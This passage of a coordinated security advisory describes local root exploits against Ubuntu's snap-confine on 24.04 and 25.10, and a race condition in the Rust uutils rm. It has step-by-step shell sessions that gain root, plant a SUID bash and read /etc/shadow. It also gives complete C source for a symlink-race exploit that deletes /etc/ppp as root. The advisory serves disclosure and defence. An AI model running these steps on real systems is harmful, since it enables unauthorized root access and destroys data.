-- inside the snap's sandbox, we frequently write to the /tmp directory
-  (but not to /tmp/.snap), and patiently wait for systemd-tmpfiles to
-  delete the unmodified /tmp/.snap directory (but not /tmp) after 10
-  days (in Ubuntu > 24.04) or 30 days (in Ubuntu 24.04);
-
-- we re-create the /tmp/.snap directory ourselves (indeed, /tmp is
-  world-writable), and create our own copy of /usr/lib/x86_64-linux-gnu
-  in /tmp/.snap/usr/lib/x86_64-linux-gnu.exchange;
-
-- we force snap-confine to set up the snap's sandbox afresh, but during
-  the creation of the /usr/lib/x86_64-linux-gnu "mimic", between step 1/
-  and step 3/, we quickly replace /tmp/.snap/usr/lib/x86_64-linux-gnu
-  with our own /tmp/.snap/usr/lib/x86_64-linux-gnu.exchange (indeed,
-  /tmp/.snap belongs to us);
-
-- as a result, during step 3/ of the creation of this "mimic",
-  snap-confine bind-mounts our own files into /usr/lib/x86_64-linux-gnu,
-  so we control every shared library and the dynamic loader (inside the
-  snap's sandbox) and can execute arbitrary code as root by simply
-  executing any dynamically-linked SUID-root binary.
-
-In the following proof of concept for Ubuntu Desktop 24.04, we put this
-theoretical idea into practice.
-
-________________________________________________________________________
-
-Exploitation
-________________________________________________________________________
-
-First, we set up the sandbox of one of the snaps that are installed by
-default on Ubuntu Desktop (the "firefox" snap) by executing snap-confine
-with the "core22" base, then we obtain an unprivileged shell inside this
-snap's sandbox, we chdir to its /tmp directory, we frequently write to
-this directory (but not to its /tmp/.snap sub-directory), and we wait
-for systemd-tmpfiles to delete the unmodified /tmp/.snap directory
-(after 30 days, in Ubuntu 24.04).
-
-------------------------------------------------------------------------
-outside$ cat /etc/os-release
-PRETTY_NAME=3D"Ubuntu 24.04.3 LTS"
-...
-
-outside$ id
-uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
-
-outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
-base core22 snap.firefox.hook.configure /bin/bash
-
-inside$ cd /tmp
-
-inside$ stat ./.snap
-...
-Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
-...
-
-inside$ while test -d ./.snap; do touch ./; sleep 60; done
-[30 days pass]
-
-inside$ stat ./.snap
-stat: cannot statx './.snap': No such file or directory
-------------------------------------------------------------------------
-
-Second, from another shell outside the snap's sandbox, we chdir to
-/tmp/snap-private-tmp/$SNAP/tmp (/tmp inside the snap's sandbox) through
-the /proc/pid/cwd of our sandboxed shell (indeed, we cannot chdir to
-/tmp/snap-private-tmp/$SNAP/tmp directly because /tmp/snap-private-tmp
-belongs to root, mode 0700), we destroy the snap's sandbox (but not its
-/tmp directory) by executing snap-confine with an invalid base (the
-"snapd" base), and we run our firefox_24.04.c helper (which is basically
-CVE-2021-44731-Desktop.c from our "Lemmings" advisory):
-
-- we re-create the ./.snap directory ourselves (/tmp/.snap inside the
-  snap's sandbox), since it was deleted by systemd-tmpfiles, and we
-  create our own copy of /snap/core22/current/usr/lib/x86_64-linux-gnu
-  in ./.snap/usr/lib/x86_64-linux-gnu.exchange;
-
-- we force snap-confine to set up the snap's sandbox afresh, by
-  executing it with the "core22" base, but we "single-step" this
-  execution of snap-confine (we set SNAPD_DEBUG=3D1, we redirect its
-  stderr to an AF_UNIX socket with minimized SO_RCVBUF and SO_SNDBUF, we
-  read() its output byte by byte, and we recv(MSG_PEEK) at its buffered
-  output), to reliably win the race condition between step 1/ and step
-  3/ of the "mimic" creation of /usr/lib/x86_64-linux-gnu;
-
-- as soon as we read() or recv() the following message (immediately
-  after step 1/ of the "mimic" creation of /usr/lib/x86_64-linux-gnu),
-
-  mount name:"/usr/lib/x86_64-linux-gnu" dir:"/tmp/.snap/usr/lib/x86_64-lin=
-ux-gnu"
-
-  we quickly replace snap-confine's ./.snap/usr/lib/x86_64-linux-gnu
-  with our own ./.snap/usr/lib/x86_64-linux-gnu.exchange, whose contents
-  are then bind-mounted into /usr/lib/x86_64-linux-gnu, thus giving us
-  full control over every shared library and the dynamic loader inside
-  the snap's sandbox.
-
-------------------------------------------------------------------------
-outside$ cd /proc/2396/cwd
-
-outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
-base snapd snap.firefox.hook.configure /nonexistent
-/user.slice/user-1001.slice/session-145.scope is not a snap cgroup
-
-outside$ systemd-run --user --scope --unit=3Dsnap.whatever /bin/bash
-Running as unit: snap.whatever.scope; invocation ID: ed50ae80aa9844d6a6e449=
-9ea1f4bba8
-
-outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
-base snapd snap.firefox.hook.configure /nonexistent
-cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_yMpga4//dev: =
-No such file or directory
-
-outside$ exit
-
-outside$ ~/firefox_24.04
-hange.go:351: DEBUG: mount name:"/usr/lib/x86_64-linux-gnu" dir:"/tmp/.snap=
-/usr/lib/x86_64-linux-gnu" type:"" opts:MS_BIND|MS_REC unparsed:"" (error: =
-<nil>)
-change.go:351: DEBUG: mount name:"tmpfs" dir:"/usr/lib/x86_64-linux-gnu" ty=
-pe:"tmpfs" opts: unparsed:"mode=3D0755,uid=3D0,gid=3D0" (error: <nil>)
-...
-change.go:351: DEBUG: mount name:"/tmp/.snap/usr/lib/x86_64-linux-gnu/ld-li=
-nux-x86-64.so.2" dir:"/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2" type:=
-"" opts:MS_BIND unparsed:"" (error: <nil>)
-...
-change.go:351: DEBUG: mount name:"/snap/firefox/6565/gnome-platform/usr/lib=
-/x86_64-linux-gnu/webkit2gtk-4.0" dir:"/usr/lib/x86_64-linux-gnu/webkit2gtk=
--4.0" type:"none" opts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
-...
-execv failed: No such file or directory
-------------------------------------------------------------------------
-
-Third, we obtain an unprivileged shell inside this newly set up sandbox,
-by executing snap-confine with the same "core22" base; and from another
-shell outside this snap's sandbox, we chdir to its / directory, through
-the /proc/pid/root of our sandboxed shell, we copy /usr/bin/busybox to
-./tmp/sh (/tmp/sh inside the snap's sandbox), and we overwrite the
-dynamic loader ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 (which
-belongs to us) with a simple shellcode that calls setreuid(0) and
-execve(/tmp/sh) (a busybox shell).
-
-------------------------------------------------------------------------
-outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
-base core22 snap.firefox.hook.configure /bin/bash
-inside$=20
-------------------------------------------------------------------------
-
-------------------------------------------------------------------------
-outside$ cd /proc/4516/root
-
-outside$ cp /usr/bin/busybox ./tmp/sh
-
-outside$ cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64=
-.so.2
-------------------------------------------------------------------------
-
-Fourth, we obtain a root shell inside the snap's sandbox, by executing
-snap-confine itself through snap-confine, which is dynamically linked
-and SUID-root and therefore executes our own dynamic loader's shellcode
-(and hence a busybox shell) as root. (Note: the snap's sandbox contains
-various SUID-root binaries, but only the execution of snap-confine is
-allowed by its AppArmor profile.)
-
-------------------------------------------------------------------------
-outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
-base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
-...
-BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
-...
-
-inside# id
-uid=3D0(root) gid=3D1001(jane) groups=3D100(users),1001(jane)
-^^^^^^^^^^^
-
-inside# cat /etc/shadow
-cat: can't open '/etc/shadow': Permission denied
-------------------------------------------------------------------------
-
-Fifth, because this root shell is still inside the snap's sandbox,
-confined by an AppArmor profile and a seccomp filter, we copy /bin/bash
-to /var/snap/$SNAP/common/ and chmod it to 04755 (both operations are
-allowed by the AppArmor profile and the seccomp filter), and execute
-this SUID-root shell from outside the snap's sandbox, thereby finally
-gaining full root privileges.
-
-------------------------------------------------------------------------
-inside# cp /bin/bash /var/snap/firefox/common/
-
-inside# chmod 04755 /var/snap/firefox/common/bash
-
-inside# exit
-
-outside$ /var/snap/firefox/common/bash -p
-
-outside# id
-uid=3D1001(jane) gid=3D1001(jane) euid=3D0(root) groups=3D1001(jane),100(us=
-ers)
-                              ^^^^^^^^^^^^
-
-outside# cat /etc/shadow
-root:*:20305:0:99999:7:::
-daemon:*:20305:0:99999:7:::
-...
-------------------------------------------------------------------------
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Case study: Ubuntu Desktop 25.10
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-    Why go fast?
-    Let life run past?
-        -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"
-
-________________________________________________________________________
-
-Overview
-________________________________________________________________________
-
-For Ubuntu Desktop 25.10 we must change our exploitation strategy,
-because snap-confine is not SUID-root anymore; instead, it now has
-capabilities attached:
-
-------------------------------------------------------------------------
-$ stat /usr/lib/snapd/snap-confine
-...
-Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
-...
-
-$ getcap /usr/lib/snapd/snap-confine
-/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,=
-cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=3Dp
-------------------------------------------------------------------------
-
-These capabilities are actually very powerful, and we can obtain them
-inside a snap's sandbox by slightly revising our exploitation strategy
-from Ubuntu 24.04 (by calling capset() and prctl(PR_CAP_AMBIENT_RAISE)
-instead of setreuid(0)), but most of these capabilities and associated
-syscalls are then denied to us by AppArmor and seccomp, thus preventing
-us from gaining full root privileges outside the snap's sandbox.
-
-Consequently, we decided to re-use the strategy that we used in our
-"Lemmings" advisory to exploit the "snap-store" snap (which is installed
-by default on Ubuntu Desktop): instead of racing against the "mimic"
-creation of /usr/lib/x86_64-linux-gnu, we race against the "mimic"
-creation of /var/lib (which is needed to bind-mount /var/lib/app-info
-inside snap-store's sandbox), which allows us to control /var/lib and
-hence /var/lib/snapd/mount/snap.snap-store.user-fstab, which in turn
-allows us to bind-mount near-arbitrary directories and obtain a root
-shell inside snap-store's sandbox, and eventually a fully privileged
-root shell outside snap-store's sandbox.
-
-________________________________________________________________________
-
-Exploitation
-________________________________________________________________________
-
-First, we set up snap-store's sandbox by executing snap-confine with the
-"core22" base, we obtain an unprivileged shell inside this sandbox, we
-chdir to its /tmp directory, we frequently write to this directory (but
-not to its /tmp/.snap sub-directory), and we wait for systemd-tmpfiles
-to delete the unmodified /tmp/.snap directory (after 10 days, in Ubuntu
-25.10).
-
-------------------------------------------------------------------------
-outside$ cat /etc/os-release
-PRETTY_NAME=3D"Ubuntu 25.10"
-...
-
-outside$ id
-uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
-
-outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confine=
- --base core22 snap.snap-store.hook.configure /bin/bash
-
-inside$ cd /tmp
-
-inside$ stat ./.snap
-...
-Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
-...
-
-inside$ while test -d ./.snap; do touch ./; sleep 60; done
-[10 days pass]
-
-inside$ stat ./.snap
-stat: cannot statx './.snap': No such file or directory
-------------------------------------------------------------------------
-
-Second, from another shell outside snap-store's sandbox, we chdir to
-/tmp/snap-private-tmp/$SNAP/tmp (/tmp inside the sandbox) through the
-/proc/pid/cwd of our sandboxed shell, we destroy snap-store's sandbox
-(but not its /tmp directory) by executing snap-confine with an invalid
-base ("snapd"), and we run our snap-store_25.10.c helper (which is also
-basically CVE-2021-44731-Desktop.c from our "Lemmings" advisory):
-
-- we re-create the ./.snap directory ourselves (/tmp/.snap inside
-  snap-store's sandbox), since it was deleted by systemd-tmpfiles, and
-  we create our own copy of /snap/core22/current/var/lib in
-  ./.snap/var/lib.exchange;
-
-- we force snap-confine to set up snap-store's sandbox afresh, by
-  executing it with the "core22" base, but we "single-step" this
-  execution (with SNAPD_DEBUG=3D1), to reliably win the race condition
-  between step 1/ and step 3/ of the "mimic" creation of /var/lib;
-
-- as soon as we see the following debug message (immediately after step
-  1/ of the "mimic" creation of /var/lib),
-
-  mount name:"/var/lib" dir:"/tmp/.snap/var/lib"
-
-  we quickly replace snap-confine's ./.snap/var/lib with our own
-  ./.snap/var/lib.exchange, whose contents are then bind-mounted into
-  /var/lib (inside snap-store's sandbox); this replacement has two
-  beneficial consequences for us:
-
-  a/ we control /var/lib/snapd/mount/snap.snap-store.user-fstab, which
-  allows us to bind-mount near-arbitrary directories inside snap-store's
-  sandbox (these bind-mounts are not completely arbitrary, because they
-  are still confined by an AppArmor profile);
-
-  b/ various SUID-root binaries remain bind-mounted in /tmp/.snap, and
-  their execution is allowed by an AppArmor rule "/tmp/** mrwlkix,"
-  inside snap-store's sandbox.
-
-------------------------------------------------------------------------
-outside$ cd /proc/4078/cwd
-
-outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confine=
- --base snapd snap.snap-store.hook.configure /nonexistent
-/user.slice/user-1001.slice/session-33.scope is not a snap cgroup
-
-outside$ systemd-run --user --scope --unit=3Dsnap.whatever /bin/bash
-Running as unit: snap.whatever.scope; invocation ID: 113af972356b4f08a58461=
-cf64cc57f6
-
-outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confine=
- --base snapd snap.snap-store.hook.configure /nonexistent
-cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_GCNDEM//dev: =
-No such file or directory
-
-outside$ exit
-
-outside$ ~/snap-store_25.10
-...
-hange.go:351: DEBUG: mount name:"/var/lib" dir:"/tmp/.snap/var/lib" type:""=
- opts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
-change.go:351: DEBUG: mount name:"tmpfs" dir:"/var/lib" type:"tmpfs" opts: =
-unparsed:"mode=3D0755,uid=3D0,gid=3D0" (error: <nil>)
-...
-change.go:426: DEBUG: umount "/tmp/.snap/var/lib" UMOUNT_NOFOLLOW|MNT_DETAC=
-H (error: invalid argument)
-change.go:399: DEBUG: ignoring EINVAL from unmount, "/tmp/.snap/var/lib" is=
- not mounted
-change.go:477: DEBUG: remove "/tmp/.snap/var/lib" (error: remove /tmp/.snap=
-/var/lib: directory not empty)
-...
-/var/lib/snapd not root-owned 1001:1001
-------------------------------------------------------------------------
-
-Third, still from outside snap-store's sandbox but inside its /tmp
-directory:
-
-- we create a copy of /etc in ./.snap/etc (/tmp/.snap/etc inside the
-  sandbox), we add /tmp/librootshell.so to ./.snap/etc/ld.so.preload, we
-  create ./librootshell.so (/tmp/librootshell.so inside the sandbox), a
-  simple shellcode that calls setreuid(0) and execve(/tmp/sh), we copy
-  /usr/bin/busybox to ./sh (/tmp/sh inside the sandbox), and we add the
-  following to ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab,
-  which will bind-mount our copy of /etc inside snap-store's sandbox:
-
-  /tmp/.snap/etc /etc none rbind,rw 0 0
-
-- we also add the following line to
-  ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab (and replace
-  our own ./.snap/var/lib with the original ./.snap/var/lib.exchange),
-  which will bind-mount the original, root-owned /var/lib/snapd inside
-  snap-store's sandbox (otherwise snap-confine dies because it detects
-  that /var/lib/snapd does not belong to root -- it belongs to us since
-  we won the race condition against the "mimic" creation of /var/lib):
-
-  /tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0
-
-------------------------------------------------------------------------
-outside$ cp -a /etc ./.snap
-...
-
-outside$ echo /tmp/librootshell.so > ./.snap/etc/ld.so.preload
-
-outside$ cp ~/librootshell.so ./
-
-outside$ cp /usr/bin/busybox ./sh
-
-outside$ echo '/tmp/.snap/etc /etc none rbind,rw 0 0' > ./.snap/var/lib/sna=
-pd/mount/snap.snap-store.user-fstab
-
-outside$ echo '/tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0' >=
-> ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab
-
-outside$ mv ./.snap/var/lib ./.snap/var/lib.exchange2
-
-outside$ mv ./.snap/var/lib.exchange ./.snap/var/lib
-------------------------------------------------------------------------
-
-Fourth, we obtain a root shell inside snap-store's sandbox, by executing
-snap-confine with one of the SUID-root binaries in /tmp/.snap (such as
-/tmp/.snap/var/lib/snapd/hostfs/snap/core22/current/usr/bin/su), which
-is dynamically linked and therefore preloads our /tmp/librootshell.so
-and executes our shellcode (and hence a busybox shell) as root.
-
-------------------------------------------------------------------------
-outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confine=
- --base core22 snap.snap-store.hook.configure /tmp/.snap/var/lib/snapd/host=
-fs/snap/core22/current/usr/bin/su
-...
-BusyBox v1.37.0 (Ubuntu 1:1.37.0-4ubuntu1) built-in shell (ash)
-...
-
-inside# id
-uid=3D0(root) gid=3D1001(jane) groups=3D100(users),1001(jane)
-^^^^^^^^^^^
-
-inside# cat /etc/shadow
-cat: can't open '/etc/shadow': No such file or directory
-------------------------------------------------------------------------
-
-Fifth, because this root shell is still inside snap-store's sandbox,
-confined by an AppArmor profile and a seccomp filter, we copy /bin/bash
-to /var/snap/$SNAP/common/ and chmod it to 04755 (both operations are
-allowed by the AppArmor profile and the seccomp filter), and execute
-this SUID-root shell from outside snap-store's sandbox, thereby finally
-gaining full root privileges.
-
-------------------------------------------------------------------------
-inside# cp /bin/bash /var/snap/snap-store/common/
-
-inside# chmod 04755 /var/snap/snap-store/common/bash
-
-inside# exit
-
-outside$ /var/snap/snap-store/common/bash -p
-
-outside# id
-uid=3D1001(jane) gid=3D1001(jane) euid=3D0(root) groups=3D1001(jane),100(us=
-ers)
-                              ^^^^^^^^^^^^
-
-outside# cat /etc/shadow
-root:*:20368:0:99999:7:::
-daemon:*:20368:0:99999:7:::
-...
-------------------------------------------------------------------------
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-A quick note on the uutils coreutils (the rust-coreutils)
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-In August 2025, before the release of Ubuntu 25.10, the Ubuntu Security
-Team proactively contacted us and kindly asked us if we were interested
-in reviewing the security of the uutils coreutils (a Rust rewrite of the
-standard GNU coreutils -- ls, cp, rm, cat, sort, sleep, etc), which are
-since then installed by default in Ubuntu 25.10.
-
-We were deeply interested, and honored, but unfortunately at the time we
-were already working full-time on another project; so we told the Ubuntu
-Security Team that we would not be able to conduct an official security
-review, but that we would try to work on it anyway during our free time.
-
-We started by carefully reading the following report, which already
-contained extremely valuable information; in particular, the mention of
-"unsafe, racy, tree walking algorithms" caught our attention:
-
-  https://bugs.launchpad.net/ubuntu/+source/rust-coreutils/+bug/2111815
-
-=46rom our work on apport (CVE-2025-5054), we then remembered that the
-shell script /etc/cron.daily/apport is installed by default on Ubuntu,
-is executed as root once per day, and can recursively delete entire
-sub-directories of /var/crash, which is world-writable like /tmp:
-
-------------------------------------------------------------------------
-$ cat /etc/cron.daily/apport
-...
-find /var/crash/. ! -name . -prune -type d -regextype posix-extended -regex=
- '.*/[0-9]{12}$' \( -mtime +7 \) -exec rm -Rf -- '{}' \;
-
-$ stat /var/crash
-...
-Access: (3777/drwxrwsrwt)  Uid: (    0/    root)   Gid: (    0/    root)
-...
-------------------------------------------------------------------------
-
-Since rm is one of the uutils coreutils, we decided to create a
-directory /var/crash/base/parent/target (as an unprivileged attacker)
-and to analyze the strace of an "rm -Rf /var/crash/base" command (as
-root), and we quickly discovered that rm was vulnerable to a trivial
-race condition:
-
-------------------------------------------------------------------------
-  1 execve("/usr/bin/rm", ["rm", "-Rf", "/var/crash/base"], ...) =3D 0
-...
-147 openat(AT_FDCWD, "/var/crash/base", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIR=
-ECTORY) =3D 3
-...
-152 openat(AT_FDCWD, "/var/crash/base/parent", O_RDONLY|O_NONBLOCK|O_CLOEXE=
-C|O_DIRECTORY) =3D 4
-...
-158 openat(AT_FDCWD, "/var/crash/base/parent/target", O_RDONLY|O_NONBLOCK|O=
-_CLOEXEC|O_DIRECTORY) =3D 5
-...
-163 rmdir("/var/crash/base/parent/target")  =3D 0
-...
-167 rmdir("/var/crash/base/parent")         =3D 0
-...
-171 rmdir("/var/crash/base")                =3D 0
-...
-174 exit_group(0)                           =3D ?
-------------------------------------------------------------------------
-
-- if, after rm calls openat() on /var/crash/base/parent (at line 152),
-  but before rm calls openat() on /var/crash/base/parent/target (at line
-  158), if the attacker replaces /var/crash/base/parent with a symlink
-  (which will be followed by rm) to another part of the filesystem (for
-  example, to /etc), then this attacker can delete arbitrary parts of
-  the filesystem, as root (the shell script /etc/cron.daily/apport is
-  executed as root);
-
-- for example, if the attacker replaces "parent" with a symlink to /etc,
-  and if "target" is "ppp", then rm will recursively delete the entire
-  /etc/ppp directory.
-
-We immediately reported this vulnerability to Ubuntu, who, as a
-temporary mitigation in Ubuntu 25.10, replaced the default rm with a
-symlink to the standard GNU coreutils' rm (i.e., in Ubuntu 25.10, rm is
-a symlink to /usr/bin/gnurm, not a symlink to the uutils coreutils'
-/usr/lib/cargo/bin/coreutils/rm).
-
-To the best of our knowledge, this vulnerability in the uutils
-coreutils' rm was later fixed upstream (by calling openat() relatively
-to each component of a path, instead of calling openat() on absolute
-paths and resolving each path component multiple times), by commits:
-
-  https://github.com/uutils/coreutils/commit/1183529cd2deafb38bed3b6bf21235=
-7b68eefa41
-  https://github.com/uutils/coreutils/commit/e773c95c4e62424db17563242c35e4=
-88a6d1ae9b
-  https://github.com/uutils/coreutils/commit/45e6cbd109a0a33d82e90c985813ea=
-83d4009714
-
-However, at the time of writing this advisory, the uutils coreutils'
-/usr/lib/cargo/bin/coreutils/rm that is shipped with Ubuntu 25.10 is
-still vulnerable (but unused, since the default is the GNU coreutils'
-rm); this allows us to test what would have happened if the vulnerable
-rm had been shipped as the default in Ubuntu 25.10. For example, below
-we run our proof of concept as an unprivileged user, and root executes
-the rm command that would have been executed by /etc/cron.daily/apport,
-thereby accidentally deleting the entire /etc/ppp directory:
-
-------------------------------------------------------------------------
-$ cat /etc/os-release
-PRETTY_NAME=3D"Ubuntu 25.10"
-...
-
-$ id
-uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
-
-$ cat > uutils_rm.c << "EOF"
-#define _GNU_SOURCE
-#include <sys/inotify.h>
-#include <sys/param.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-#include <dirent.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <utime.h>
-
-#define die() do { \
-    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
-    exit(EXIT_FAILURE); \
-} while (0)
-
-int
-main(const int argc, const char * const argv[])
-{
-    if (argc < 3) die();
-    const char * const writable_dir =3D argv[1];
-    if (*writable_dir !=3D '/') die();
-
-    const char * const parent_dir =3D strdup(argv[2]);
-    if (!parent_dir) die();
-    char * const last_slash =3D strrchr(parent_dir, '/');
-    if (!last_slash) die();
-
-    const char * const target_dir =3D strdup(last_slash + 1);
-    if (!target_dir) die();
-
-    last_slash[1] =3D '\0';
-    if (*parent_dir !=3D '/') die();
-    if (!*target_dir) die();
-
-    unsigned long n_pre_dirs =3D 32;
-    if (argc > 3) {
-        if (argc !=3D 4) die();
-        n_pre_dirs =3D strtoul(argv[3], NULL, 0);
-    }
-    if (n_pre_dirs <=3D 0) die();
-    if (n_pre_dirs > (1u<<20)) die();
-
-    if (chdir(writable_dir)) die();
-    char base_dir[] =3D "XXXXXX";
-    if (!mkdtemp(base_dir)) die();
-    if (chdir(base_dir)) die();
-
-    if (mkdir("parent", 0700)) die();
-    if (chdir("parent")) die();
-    if (mkdir(target_dir, 0700)) die();
-
-    const char * first_dir =3D NULL;
-    for (;;) {
-        char try[] =3D "XXXXXX";
-        if (!mkdtemp(try)) die();
-
-        unsigned long n =3D 0;
-        DIR * const dirp =3D opendir(".");
-        if (!dirp) die();
-        for (;;) {
-            const struct dirent * const entp =3D readdir(dirp);
-            if (!entp) die();
-            if (*entp->d_name =3D=3D '.') continue;
-            if (!strcmp(entp->d_name, target_dir)) break;
-            n++;
-            if (!first_dir) {
-                first_dir =3D strdup(entp->d_name);
-                if (!first_dir) die();
-            }
-        }
-        if (closedir(dirp)) die();
-        if (n >=3D n_pre_dirs) break;
-    }
-    if (!first_dir) die();
-
-    if (chdir(first_dir)) die();
-    unsigned long i;
-    for (i =3D 0; i < n_pre_dirs; i++) {
-        char num[256];
-        snprintf(num, sizeof(num), "%lu", i);
-        if (mkdir(num, 0700)) die();
-    }
-    const int in_fd =3D inotify_init();
-    if (in_fd <=3D -1) die();
-    if (inotify_add_watch(in_fd, ".", IN_ATTRIB) <=3D -1) die();
-
-    if (chdir("..")) die();
-    if (chdir("..")) die();
-    if (symlink(parent_dir, "../switch")) die();
-    static const struct utimbuf epoch =3D { 1, 1 };
-    if (utime(".", &epoch)) die();
-
-    fprintf(stderr, "ready\n");
-    static char in_buf[sizeof(struct inotify_event) + NAME_MAX + 1];
-    if (read(in_fd, in_buf, sizeof(in_buf)) < (ssize_t)sizeof(struct inotif=
-y_event)) die();
-    if (renameat2(AT_FDCWD, "parent", AT_FDCWD, "../switch", RENAME_EXCHANG=
-E)) die();
-    die();
-}
-EOF
-
-$ gcc -s -o uutils_rm uutils_rm.c
-
-$ stat /etc/ppp
-...
-Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
-...
-
-$ ./uutils_rm /var/crash /etc/ppp
-ready
-------------------------------------------------------------------------
-
-Then, as root (to simulate the /etc/cron.daily/apport shell script):
-
-------------------------------------------------------------------------
-# id
-uid=3D0(root) gid=3D0(root) groups=3D0(root)
-
-# dpkg -S /usr/lib/cargo/bin/coreutils/rm
-rust-coreutils: /usr/lib/cargo/bin/coreutils/rm
-
-# dpkg -l rust-coreutils
-...
-ii  rust-coreutils 0.2.2-0ubuntu2.1 amd64        Universal coreutils utils,=
- written in Rust
-
-# find /var/crash/. ! -name . -prune -type d \( -mtime +7 \) -exec /usr/lib=
-/cargo/bin/coreutils/rm -Rf -- '{}' \;
-...
-
-# stat /etc/ppp
-stat: cannot stat '/etc/ppp': No such file or directory (os error 2)
-------------------------------------------------------------------------
-
-Back in September 2025, we reported this vulnerability to Ubuntu as a
-denial of service (the ability to delete arbitrary files and directories
-as root), but after writing this advisory it became perfectly clear that
-this vulnerability was actually powerful enough to be transformed into a
-Local Privilege Escalation (LPE) to full root (for example by deleting a
-/tmp/snap-private-tmp/$SNAP/tmp/.snap directory). Fortunately, this LPE
-was avoided thanks to the Ubuntu Security Team, who proactively reached
-out to us and mitigated it before the release of Ubuntu 25.10.
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Acknowledgments
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-We thank everyone at Canonical who worked on this release (Seth Arnold,
-Zygmunt Krynicki, Nick Dyer, Eduardo Barretto, and Luci Stanescu, in
-particular) and on the uutils coreutils with us (Octavio Galland, Ravi
-Kant Sharma, Seth Arnold, and Julian Andres Klode, in particular). We
-also thank the members of the linux-distros mailing list (Alexander
-Peslyak in particular).
-
-Finally, we dedicate this advisory to Felix Lindner:
-
-  https://phenoelit.de/fx.html
-  https://defcon.social/@thedarktangent/116157827849844661
-
-
